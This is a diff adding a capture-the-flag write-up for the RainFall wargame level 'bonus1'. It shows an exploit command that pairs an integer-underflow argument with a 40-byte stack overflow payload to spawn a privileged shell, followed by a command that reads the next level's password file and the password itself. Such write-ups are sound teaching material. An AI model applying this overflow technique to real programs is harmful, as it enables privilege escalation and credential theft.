@@ -1,0 +1,14 @@
+bonus1@RainFall:~$ ./bonus1 -2147483610 `python -c 'print "A"*40 + "\x46\x4c\x4f\x57"'`
+$ id
+uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+The program checks if the first argument is less or equal to 9 (else it exits), then memcpy the second argument to stack, setting the length to the first parameter
+Then it checks again if the first parameter on stack has changed by comparing it to 0x574f4c46 (which cannot be set directly by an int underflow, the maximum we can go is 0x80000000)
+We'll just provoke an integer underflow and pass the first check, by overflowing the INT MAX value to return to small values for the memcpy parameter call
+Sending, for example, -2147483610 will make memcpy read 0x90 characters from our buffer and store them to another buffer on stack, that we will overflow to change the first parameter argv[1]
+
+The overflow offset is at 40 bytes, so we send "A" * 40 + "\x46\x4c\x4f\x57" (that's 0x574f4c46) to change argv[1] and pass the second check
+Once the second check is passed, a shell is executed through execl("/bin/sh"), otherwise the program exits as well
+Once the shell pops, just read the flag in /home/user/bonus2/.pass
